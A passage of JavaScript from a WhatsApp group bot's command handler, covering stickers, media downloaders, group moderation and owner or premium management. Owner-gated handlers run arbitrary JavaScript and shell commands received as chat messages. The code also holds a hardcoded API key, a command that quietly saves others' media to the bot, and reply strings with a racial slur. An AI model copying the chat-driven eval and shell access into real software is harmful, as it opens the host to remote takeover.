    const code = await gz.groupInviteCode(cret.id);
    const link = `https://chat.whatsapp.com/${code}`;

    const teks = `「 Group Created 」
▸ *Name:* ${cret.subject}
▸ *Group ID:* ${cret.id}
▸ *Owner:* @${cret.owner.split("@")[0]}
▸ *Created:* ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}
▸ *Invite Link:* ${link}`;

    gz.sendMessage(m.chat, {
      text: teks,
      mentions: [cret.owner]
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    reply("❌ Failed to create group. Please check and try again.");
  }
}
break;
case 'ss':
case 'ssweb':
  if (!text) return reply(' *Please provide a URL to screenshot!*\n\nExample:\nssweb https://google.com');
  try {
    const ssApi = `https://api-rebix.vercel.app/api/ssweb?url=${encodeURIComponent(text)}`;
    const { data } = await axios.get(ssApi, { responseType: 'arraybuffer' });

    await gz.sendMessage(m.chat, {
      image: data,
      caption: `🖼️ Screenshot of:\n${text}\n\n> POWERED by 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗`
    }, { quoted: m });
  } catch (e) {
    console.error('[SSWEB ERROR]', e);
    reply('❌ Failed to get screenshot. Make sure the URL is valid and try again.');
  }
  break;
  case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!isCreator) return reply('😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!isAdmins) return reply('Admin only!!')
gz.groupRevokeInvite(m.chat)
}
break;
  case 'img':
case 'image':
case 'searchimage': {
  if (!text) return reply(`*Usage:* \`${prefix}image <query>\`\nExample: \`${prefix}image furry\``);

  try {
    const apiUrl = `https://fastrestapis.fasturl.cloud/search/gimage?ask=${encodeURIComponent(text)}`;
    const res = await fetch(apiUrl);
    
    if (!res.ok) {
      console.error(`API Error: ${res.status}`);
      return reply('⚠️ Image service unavailable. Try again later.');
    }

    const json = await res.json();
    const data = json.result;

    if (!Array.isArray(data) || data.length === 0) {
      return reply(` No images found for "${text}"`);
    }

    // Send first 5 images
    for (let i = 0; i < Math.min(data.length, 5); i++) {
      const img = data[i]?.image;
      if (!img) continue;

      try {
        await gz.sendMessage(m.chat, {
          image: { url: img },
          caption: `🖼️ *${text}*\n🔗 ${data[i].title}`
        }, { quoted: m });
      } catch (e) {
        console.error(`❌ Failed to send image #${i+1}:`, e.message);
      }
    }

  } catch (err) {
    console.error('IMAGE SEARCH ERROR:', err);
    reply(`⚠️ Error: ${err.message}`);
  }
  break;
}
case 'eval': {
  if (!isOwner) return reply('This command is only for my owner only brr.');
  try {
    let evaled = await eval(`(async () => { ${text} })()`);
    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
    reply(evaled);
  } catch (err) {
    reply(`Error:\n${err}`);
  }
}
break;
// take 
case 'toimg':
  {
    const quoted = m.quoted ? m.quoted : null
    const mime = (quoted?.msg || quoted)?.mimetype || ''
    if (!quoted) return reply('Reply to a sticker/image.')
    if (!/webp/.test(mime)) return reply(`Reply to a sticker with *${prefix}toimg*`)
    if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp')
    const media = await gz.downloadMediaMessage(quoted)
    const filePath = `./tmp/${Date.now()}.jpg`
    fs.writeFileSync(filePath, media)
    await gz.sendMessage(m.chat, { image: fs.readFileSync(filePath) }, { quoted: m })
    fs.unlinkSync(filePath)
  }
  break
  case 'ttsearch': {
    const dann = require('d-scrape')
if (!text) return reply(` cindigo `)
await gz.sendMessage(m.chat, {react: {text: '🤐', key: m.key}})
try {
let anu = await dann.search.tiktoks(text)
gz.sendMessage(m.chat, { video: { url: anu.no_watermark }, mimetype: 'video/mp4', caption: anu.title }, { quoted : m })
} catch (error) {
reply('Error : cannot fetch from query')
}
}
break;
case 'sticker': case 's': {
if (!isCreator) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT Nigga');
  if (!m.quoted) return reply(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await gz.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return m.reply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await gz.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return reply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
// WAGWANNNN

      break
case 'rich': case 'steal': case 'stickerwm': case 'take': case 'wm': {
if (!isCreator) return reply(' 😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `GODSZEAL`
	let dua = typeof ahuh[1] !== '𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗' ? ahuh[1] : `𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗`
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await gz.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🥰', '🥳'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await gz.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break;
	
  case "play": {
if (!text) return reply(example("past lives"))
await gz.sendMessage(m.chat, {react: {text: '🦜', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await gz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await gz.sendMessage(m.chat, {react: {text: '', key: m.key}})
} else {
return reply("Error! Result Not Found")
}
}
break;
case 'gfx':
case 'gfx2':
case 'gfx3':
case 'gfx4':
case 'gfx5':
case 'gfx6':
case 'gfx7':
case 'gfx8':
case 'gfx9':
case 'gfx10':
case 'gfx11':
case 'gfx12': {
  const [text1, text2] = text.split('|').map(v => v.trim());
  if (!text1 || !text2) {
    return reply(` *𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 - GFX*\n\n\`\`\`Example:\`\`\` *${prefix + command} 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 | Dev*`);
  }

  reply(` *Generating your stylish image...*\n\n🔤 *Text 1:* ${text1}\n🔡 *Text 2:* ${text2}\n\n⏳ Please wait!`);

  try {
    const style = command.toUpperCase();
    const apiUrl = `https://api.nexoracle.com/image-creating/${command}?apikey=d0634e61e8789b051e&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`;

    await sendImage(apiUrl, `✨ *𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗  😙 - ${style} Style*\n\n🔤 *Text 1:* ${text1}\n🔡 *Text 2:* ${text2}`);
  } catch (err) {
    console.error(err);
    reply(`❌ *𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 😙 Error: Failed to generate ${command.toUpperCase()} image.*`);
  }
  break;
}
case 'kick': {
if (!isCreator) return reply("```for My Owner only```.");
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
  if (!m.quoted) return reply("```Tag or quote the user to kick!```");
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("``` Only group admins have the ability and authority to kick members```");
  if (!isBotAdmins) return reply("``` Please make me an admin first```");

  let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await gz.groupParticipantsUpdate(m.chat, [users], 'remove');
  reply("``` User has been kicked```");
}
break;

case 'tagadmin':
case 'listadmin':
case 'admin': {
  if (!isCreator) return reply("``` For My Owner only```");
  if (!m.isGroup) return reply(msg.only.group);

  const groupAdmins = participants.filter(p => p.admin);
  const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
  const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net';

  let text = `* Group Admins:*\n${listAdmin}`;
  gz.sendMessage(m.chat, {
    text,
    mentions: [...groupAdmins.map(v => v.id), owner]
  }, { quoted: m });
}
break;

case 'delete':
case 'del': {
  if (!isCreator) return reply("``` For My Owner only```");
  if (!m.quoted) return reply("``` Reply to a message to delete it```");

  gz.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.quoted.id,
      participant: m.quoted.sender
    }
  });
}
break;
case "kickall":
if (!isCreator) return reply("```for My Owner only```.");
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins) return reply(mess.admin)
let users = participants.filter((u) => !areJidsSameUser(u.id, gz.user.id)); 
   let kickedUser = []; 
   for (let user of users) { 
     if (user.id.endsWith("@s.whatsapp.net") && !user.admin) { 
       await kickedUser.push(user.id); 
       await sleep(1 * 1000); 
     } 
   } 
   if (!kickedUser.length >= 1) 
     return reply("In this group there are no members except you and me"); 
   const res = await gz.groupParticipantsUpdate(m.chat, kickedUser, "remove"); 
   await sleep(3000); 
   await reply( 
     `sucessfully kicked member\n${kickedUser.map( 
       (v) => "@" + v.split("@")[0] 
     )}`, 
     null, 
     { 
       mentions: kickedUser, 
     } 
   ); 
break;
case 'toimg': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤐🫵');
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replynano(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await gz.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            gz.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return reply(`Please reply to non animated sticker`)
    }
    break;

case 'linkgroup':
case 'linkgc':
case 'gclink':
case 'grouplink': {
  if (!m.isGroup) return reply(msg.only.group);
  if (!isBotAdmins) return reply("``` Bot must be admin```");

  let response = await gz.groupInviteCode(m.chat);
  gz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\n*🔗 Group Link:* ${groupMetadata.subject}`, m, { detectLink: true });
}
break;

case 'join': {
  if (!isCreator) return reply("``` For My Owner only```");
  if (!text) return reply(`Example: *${prefix + command} <group link>*`);
  if (!isUrl(args[0]) || !args[0].includes('whatsapp.com')) return reply("```❌ Invalid group link!```");

  let result = args[0].split('https://chat.whatsapp.com/')[1];
  await gz.groupAcceptInvite(result);
  reply("``` Successfully joined the group```");
}
break;
case 'tag':
case 'totag': {
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("``` Only group admins```");
  if (!isBotAdmins) return reply("``` Bot must be admin```");
  if (!m.quoted) return reply(`Reply with ${prefix + command} to a message`);

  gz.sendMessage(m.chat, {
    forward: m.quoted.fakeObj,
    mentions: participants.map(a => a.id)
  });
}
break;
case 'tagall': {
  if (!isCreator) return reply("```For my Owner only```");
  if (!m.isGroup) return reply(msg.only.group);

  const textMessage = args.join(" ") || "_No context or message provided_";
  let teks = `\`\`\` Tagging all members:\`\`\`\n> *${textMessage}*\n\n`;

  const groupMetadata = await gz.groupMetadata(m.chat);
  const participants = groupMetadata.participants;

  for (let mem of participants) {
    teks += `@${mem.id.split("@")[0]}\n`;
  }

  gz.sendMessage(m.chat, {
    text: teks,
    mentions: participants.map((a) => a.id)
  }, { quoted: m });
}
break;

case 'hidetag': {
if (!isCreator) return m.reply("```for My Owner only```.");
gz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}

case 'promote': {
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("```Only group admins can use this!```");
  if (!isBotAdmins) return reply("``` Bot needs to be admin first!```");

  let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await gz.groupParticipantsUpdate(m.chat, [users], 'promote');
  reply("```User promoted to admin```");
}
break;

break;
case 'demote': {
  if (!m.isGroup) return reply(msg.only.group);
  if (!isAdmins) return reply("```Only group admins can use this!```");
  if (!isBotAdmins) return reply("``` Bot needs to be admin first!```");

  let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await gz.groupParticipantsUpdate(m.chat, [users], 'demote');
  reply("``` User demoted from admin```");
}
break;

case 'mute': {
  if (!m.isGroup) return reply("```Group command only```");
  if (!isAdmins) return reply("```Admins only```");
  if (!isBotAdmins) return reply("``` Bot needs to be admin```");

  await gz.groupSettingUpdate(m.chat, 'announcement');
  reply("*🔒 Group silenced.*  *⚠️ All chatter terminated — only the higher ranks (admins) may now speak.*  *🩸 Disobedience won't be tolerated.*");
}
break;

case 'unmute': {
  if (!m.isGroup) return reply("``` Group command only```");
  if (!isAdmins) return reply("``` Admins only```");
  if (!isBotAdmins) return reply("``` Bot needs to be admin```");

  await gz.groupSettingUpdate(m.chat, 'not_announcement');
  reply("*🔊 Restrictions lifted.*  *🗣️ The silence is broken — all members may now speak freely.*  *⚠️ Choose your words wisely… the 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 is still watching.*");
}
break;

case 'left': {
  if (!isCreator) return reply("```For Owner only```");
  await gz.groupLeave(m.chat);
  reply("``` Bye 👋 It was cool and somehow nice being here```");
}
break;

case 'add': {
  if (!isCreator) return reply("``` For My Owner only```");
  if (!m.isGroup) return reply(msg.only.group);
  if (!isBotAdmins) return reply("``` Bot must be admin```");

  let users = m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await gz.groupParticipantsUpdate(m.chat, [users], 'add');
  reply("``` User added to group```");
}
break;
case 'tiktok':
case 'tt': {
if (!isCreator) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 😄');
replygc(mess.wait)
await sleep(100);
  if (!text) return reply(`Example: ${prefix + command} link`);
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER BY 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 ]*

> *Video found* ${data.author.name ?? ''} (@${data.author.unique_id ?? ''})
> *Likes*: ${data.stats.likeCount ?? ''}
> *Comments*: ${data.stats.commentCount ?? ''}
> *Shares*: ${data.stats.shareCount ?? ''}
> *Plays*: ${data.stats.playCount ?? ''}
> *Saves*: ${data.stats.saveCount ?? ''}

> \`Downloader By ${botname}\`
`;
  gz.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
  const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(text)}`)
  const videoUrl = response.result.video;
  const captionn = `*[ TIKTOK DOWNLOADER ]*

Likes: ${response.result.statistics.likeCount ?? ''}
Comments: ${response.result.statistics.commentCount ?? ''}
Shares: ${response.result.statistics.shareCount ?? ''}
by ${response.result.author.nickname ?? ''}

\`⏤͟͟͞͞ Downloader By ${botname}\`
  `;
  gz.sendMessage(m.chat, { caption: captionn, video: { url: videoUrl } }, { quoted: m })
}

}
break;
case 'igdl':
case 'Instagram':
case 'ig': {
  if (!text) return reply(` *Instagram Downloader*\n\nExample:\n.ig <instagram_post/reel_url>`);

  try {
    const res = await fetch(`https://fastrestapis.fasturl.cloud/downup/igdown/simple?url=${encodeURIComponent(text)}`);
    const json = await res.json();

    if (json.status !== 200 || !json.result?.status) {
      return reply('Failed to fetch Instagram media. Make sure the link is valid and public.');
    }

    const media = json.result.data[0];

    await gz.sendMessage(m.chat, {
      video: { url: media.url },
      caption: `✅ *Instagram Video Downloaded*\n\n🌐 URL: ${text}`,
    }, { quoted: m });

  } catch (err) {
    console.error('[IG ERROR]', err);
    reply(' An error occurred while downloading the Instagram video.');
  }
  break;
}
case 'tr': {
  if (!m.quoted || !m.quoted.text) return reply('Reply to a message you want to be translated.');

  const query = encodeURIComponent(m.quoted.text.trim());
  const targetLang = 'en';
  const api = `https://fastrestapis.fasturl.cloud/tool/translate?text=${query}&target=${targetLang}`;

  try {
    const res = await fetch(api);
    const json = await res.json();

    if (json.status !== 200) return reply(' Failed to translate.');

    const result = `*Translated to English*\n\n📝 *Original:* ${m.quoted.text.trim()}\n📘 *Result:* ${json.result.translatedText}`;
    reply(result);
  } catch (err) {
    console.error('[TRANSLATE ERROR]', err);
    reply(' Error translating message.');
  }
  break;
}
case 'git':
case 'gitclone': {
  if (!args[0]) return reply(m.chat, `Where is the link?\nExample:\n${prefix + command} https://github.com/user/repo`, m);
  if (!isUrl(args[0]) || !args[0].includes('github.com')) return reply(m.chat, `✖️ Invalid GitHub link!`, m);

  let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/([^\/\s]+)(?:\.git)?/i;
  let match = args[0].match(regex1);
  if (!match) return reply(m.chat, `✖️ Unable to parse GitHub URL.\nMake sure it's like:\nhttps://github.com/user/repo`, m);

  let [, user, repo] = match;
  let url = `https://api.github.com/repos/${user}/${repo}/zipball`;

  try {
    let response = await fetch(url, { method: 'HEAD' });
    let contentDisposition = response.headers.get('content-disposition');
    let filename = contentDisposition?.match(/attachment; filename="?(.+?)"?$/)?.[1] || `${repo}.zip`;

    await reply(m.chat, `「 *${botname} GitCloner* 」\n Repo: *${user}/${repo}*\n📦 File: *${filename}*\n Sending zipped repo...\n> powered by ® 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 `, m);

    await gz.sendMessage(m.chat, {
      document: { url },
      fileName: filename,
      mimetype: 'application/zip'
    }, { quoted: m });
  } catch (err) {
    console.error(err);
    reply(m.chat, ` Failed to fetch GitHub repo.\nMaybe it’s private or doesn’t exist.`, m);
  }
}
break;
case 'download':
case 'save':
case 'svt': {
  if (!isCreator) return reply("```for Owner only```.");
  const quotedMessage = m.msg.contextInfo.quotedMessage;
  if (quotedMessage) {
    if (quotedMessage.imageMessage) {
      let imageCaption = quotedMessage.imageMessage.caption;
      let imageUrl = await gz.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
      gz.sendMessage(botNumber, { image: { url: imageUrl }, caption: imageCaption });
    }
    if (quotedMessage.videoMessage) {
      let videoCaption = quotedMessage.videoMessage.caption;
      let videoUrl = await gz.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
      gz.sendMessage(botNumber, { video: { url: videoUrl }, caption: videoCaption });
    }
  }
}
break;
case 'furbrat': {
  if (!text) return reply('Provide text to turn into a furBrat sticker!\nExample: .brat Yo');

  // Make sure only the text after ".brat" is used, no command part
  const inputText = text.trim();

  const imageUrl = `https://fastrestapis.fasturl.cloud/maker/furbrat?text=${encodeURIComponent(inputText)}`;

  try {
    await gz.sendImageAsSticker(m.chat, imageUrl, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error('Brat sticker generation error:', err);
    reply('Oops! Failed to create your Brat sticker.');
  }
}
break;
case 'brat': {
  if (!text) return reply('Provide text to turn into a Brat sticker!\nExample: .brat Yo');

  // Make sure only the text after ".brat" is used, no command part
  const inputText = text.trim();

  const imageUrl = `https://www.laurine.site/api/generator/brat?text=${encodeURIComponent(inputText)}`;

  try {
    await gz.sendImageAsSticker(m.chat, imageUrl, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error('Brat sticker generation error:', err);
    reply('Oops! Failed to create your Brat sticker.');
  }
}
break;
case 'tourl': {    

    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return reply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('Failed to download media!');
    }

    const uploadImage = require('./allfunc/Data6.js');
    const uploadFile = require('./allfunc/Data7.js');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply('Failed to upload media!');
    }

    gz.sendMessage(m.chat, {
        text: `[\`\`\`DONE BY ${botname} XD]\`\`\` \n[${link}]`
    }, { quoted: m });
}
break;
case 'setppbot': {
  if (!isCreator) return reply('This command is  for my owner only.');
  if (!quoted || !/image/.test(mime)) return reply(`Reply to an image to set as bot profile picture.`);
  let media = await quoted.download();
  await gz.updateProfilePicture(botNumber, media);
  reply('╭─〔 POWERED BY 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗  〕\n Profile picture updated.');
}
break;


case 'react-ch': 
case 'reactch': {
    // Help message if no args or user doesn't have required privileges
    if (!args[0] || (!isCreator && !isPremium && !isDev)) {
        return reply(`
Hello *${m.pushName || 'Unknown'}* 👋

To use this command, type:
${prefix + command} <channel-link> <emoji>

Example:
${prefix + command} https://whatsapp.com/channel/XXXXXXXX🤨

┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
🙃 𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 
`);
    }

    // Validate WhatsApp channel link format
    // Replace the current URL validation with this:
    if (!args[0].startsWith("https://whatsapp.com/channel/")) {
        return reply("Invalid channel link.");
    }
    

    // Process emoji input (either provided or random)
    let reactionEmoji;
    if (args[1]) {
        // Use the first emoji if multiple are provided
        reactionEmoji = args[1].trim();
        
        // Validate it's a single emoji
        const emojiRegex = /\p{Emoji}/u;
        if (!emojiRegex.test(reactionEmoji) || reactionEmoji.length > 4) {
            return reply("❌ Please provide a single valid emoji for the reaction.");
        }
    } else {
        // Default random emojis if none provided
        const randomEmojis = ['👍', '❤️', '🔥', '🎉', '👀', '🤯', '💯'];
        reactionEmoji = randomEmojis[Math.floor(Math.random() * randomEmojis.length)];
    }

    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        
        // Get channel metadata
        const channelInfo = await gz.newsletterMetadata("invite", channelId);
        if (!channelInfo || !channelInfo.id) {
            return reply("❌ Could not retrieve channel information. The link might be invalid.");
        }

        // Extract message ID if present in link
        const messageId = link.split('/')[5] || null;
        if (!messageId) {
            return reply("❌ The link should point to a specific channel message.\nMake sure you're using a message link, not just a channel link.");
        }

        // Send the reaction
        await gz.newsletterReactMessage(channelInfo.id, messageId, reactionEmoji);

        // Success response
        return reply(`✅ Reaction sent successfully!\n\n` +
                    `🔹 Channel: ${channelInfo.name || 'Unknown'}\n` +
                    `🔹 Reaction: ${reactionEmoji}\n` +
                    `🔹 Message ID: ${messageId}`);
        
    } catch (error) {
        console.error('Reaction Error:', error);
        
        let errorMessage = "❌ Failed to send reaction.";
        if (error.message.includes("not found")) {
            errorMessage += "\nThe message or channel might not exist or you don't have access.";
        } else if (error.message.includes("rate limit")) {
            errorMessage += "\nYou're sending reactions too quickly and early. Wait a moment and try again.";
        } else {
            errorMessage += `\nError: ${error.message}`;
        }
        
        return reply(errorMessage);
    }
}
break;
case 'sc': case 'pairgroup': case 'repo':  case 'script':  {
let teks = `
\`\`\`𝗚𝗘𝗧 𝗬𝗢𝗨𝗥 𝗢𝗪𝗡 𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗧𝗛𝗥𝗢𝗨𝗚𝗛 𝗧𝗛𝗜𝗦  𝗟𝗜𝗡𝗞\`\`\`
[https://t.me/aitoolshub01 or https://t.me/godszealtech]
\`\`\`𝗬𝗢𝗨 𝗖𝗔𝗡 𝗚𝗢 𝗧𝗛𝗘𝗥𝗘 𝗔𝗡𝗗 𝗣𝗔𝗜𝗥\`\`\` \n\`𝗖𝗢𝗠𝗠𝗔𝗡𝗗 /pair\`
*example /pair 234xx*
\`\`\`𝗧𝗢 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗨𝗦 𝗔𝗟𝗦𝗢 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟\`\`\`
\`𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗟𝗜𝗡𝗞\`
[https://whatsapp.com/channel/0029VaXKAEoKmCPS6Jz7sw0N]
> \`𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗\`
`
return reply(teks)
}
break;
// end
case 'addowner': case 'addown': {
    if (!isCreator) return reply("Owner only.");
    if (!args[0]) return reply(`Usage: ${command} 234xxx`);

    let number = qtext.replace(/[^0-9]/g, '');
    let checkNumber = await gz.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return reply("Invalid number!");

    owner.push(number);
    Premium.push(number);
    fs.writeFileSync('./allfunc/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./allfunc/premium.json', JSON.stringify(Premium));

    reply("Owner added successfully.");
}
break;

case 'delowner': case 'delown': {
    if (!isCreator) return reply("Owner only.");
    if (!args[0]) return reply(`Usage: ${command} 234xxx`);

    let number = qtext.replace(/[^0-9]/g, '');
    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./allfunc/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./allfunc/premium.json', JSON.stringify(Premium));

    reply("Owner removed successfully.");
}
break;

case 'addpremium': case 'addprem': {
    if (!isCreator) return reply("Owner only!");
    if (!args[0]) return reply(`Usage: ${prefix + command} 234xxx`);

    let number = qtext.split("|")[0].replace(/[^0-9]/g, '');
    let ceknum = await gz.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return reply("Invalid number!");

    Premium.push(number);
    fs.writeFileSync('./allfunc/premium.json', JSON.stringify(Premium));

    reply("Success! User added to premium.");
}
break;

case 'delpremium': case 'delprem': {
    if (!isCreator) return reply("Owner only!");
    if (!args[0]) return reply(`Usage: ${prefix + command} 234xxx`);

    let number = qtext.split("|")[0].replace(/[^0-9]/g, '');
    let indexPremium = Premium.indexOf(number);

    if (indexPremium !== -1) {
        Premium.splice(indexPremium, 1);
        fs.writeFileSync('./allfunc/premium.json', JSON.stringify(Premium));
        reply("Success! User removed from premium.");
    } else {
        reply("User is not in the premium list.");
    }
}
break;
case 'runtime': case 'alive': { 
         reply(`𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗 ιƨ αcтιѵɛ  \n s⍴ᥱᥱძ\n : ${runtime(process.uptime())} `); 
}
break
 case 'ping': case 'speed': { 

let timestamp = speed()
let latensi = speed() - timestamp

         reply (`\`\`\`𝗝𝗨𝗣𝗜𝗧𝗘𝗥 𝗠𝗗\`\`\`\n\◈   𝐒𝐏𝐄𝐄𝐃  : ${latensi.toFixed(4)} 𝐌𝐒`); 
}
break;
case 'public': {
    if (!isCreator) return reply("Owner only.");
    gz.public = true;
    reply("𝙱𝙾𝚃 𝚂𝙴𝚃 𝚃𝙾 𝙿𝚄𝙱𝙻𝙸𝙲 𝙼𝙾𝙳𝙴 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈");
}
break;

case 'private': case 'self': {
    if (!isCreator) return reply("Owner only.");
    gz.public = false;
    reply("𝙱𝙾𝚃 𝚂𝙴𝚃 𝚃𝙾 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 𝙼𝙾𝙳𝙴 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈.");
}
break;

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})